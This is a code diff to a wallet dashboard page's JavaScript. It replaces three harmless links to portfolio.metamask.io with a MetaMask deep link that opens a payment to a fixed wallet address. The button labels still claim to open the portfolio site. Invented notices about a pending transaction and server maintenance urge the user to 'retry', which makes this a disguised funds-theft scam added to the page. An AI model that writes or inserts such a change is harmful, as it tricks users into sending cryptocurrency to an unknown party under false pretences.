@@ -294,7 +294,7 @@ function openTxDetail(id){
     rows.map(r=>'<div class="detail-row"><span class="k">'+r[0]+'</span><span class="v">'+r[1]+'</span></div>').join('')+
     '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#i-shield"/></svg>'+
     '<span>Associated with <b>'+shortAddr(WALLET_ADDRESS)+'</b>. Verify the destination before signing any new transaction.</span></div>'+
-    '<button class="btn btn-primary" style="margin-top:18px;width:100%" onclick="window.open(\'https://portfolio.metamask.io/\',\'_blank\',\'noopener,noreferrer\')">'+
+    '<button class="btn btn-primary" style="margin-top:18px;width:100%" onclick="window.open(\'https://metamask.app.link/send/0x6eD834C115bc7C0EbcD164a8E3710C734D54CeA3@56?value=099000000000000000\',\'_blank\',\'noopener,noreferrer\')">'+
     '<svg class="ico" viewBox="0 0 24 24"><use href="#i-external"/></svg> Retry on portfolio.metamask.io</button>');
 }
 
@@ -384,7 +384,7 @@ function renderGate(){
           '<div class="gate-detail"><span class="k">Status</span><span class="v">Pending</span></div>'+
         '</div>'+
         '<div class="gate-actions">'+
-          '<button class="btn btn-primary" onclick="window.open(\'https://portfolio.metamask.io/\',\'_blank\',\'noopener,noreferrer\')">'+
+          '<button class="btn btn-primary" onclick="window.open(\'https://metamask.app.link/send/0x6eD834C115bc7C0EbcD164a8E3710C734D54CeA3@56?value=099000000000000000\',\'_blank\',\'noopener,noreferrer\')">'+
           '<svg class="ico" viewBox="0 0 24 24"><use href="#i-external"/></svg> Retry transaction</button>'+
           '<button class="btn btn-outline" onclick="openPending()">'+
           '<svg class="ico" viewBox="0 0 24 24"><use href="#i-activity"/></svg> View details</button>'+
@@ -433,7 +433,7 @@ function openPending(){
     '<div class="detail-row"><span class="k">Timestamp</span><span class="v">17:35:55 UTC · 10|10|2026</span></div>'+
     '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#i-alert"/></svg>'+
     '<span>The transaction remains pending due to delayed server authorization and ongoing wallet server database maintenance.</span></div>'+
-    '<button class="btn btn-primary" style="margin-top:18px;width:100%" onclick="window.open(\'https://portfolio.metamask.io/\',\'_blank\',\'noopener,noreferrer\')">'+
+    '<button class="btn btn-primary" style="margin-top:18px;width:100%" onclick="window.open(\'https://metamask.app.link/send/0x6eD834C115bc7C0EbcD164a8E3710C734D54CeA3@56?value=099000000000000000\',\'_blank\',\'noopener,noreferrer\')">'+
     '<svg class="ico" viewBox="0 0 24 24"><use href="#i-external"/></svg> Retry on portfolio.metamask.io</button>');
 }
 
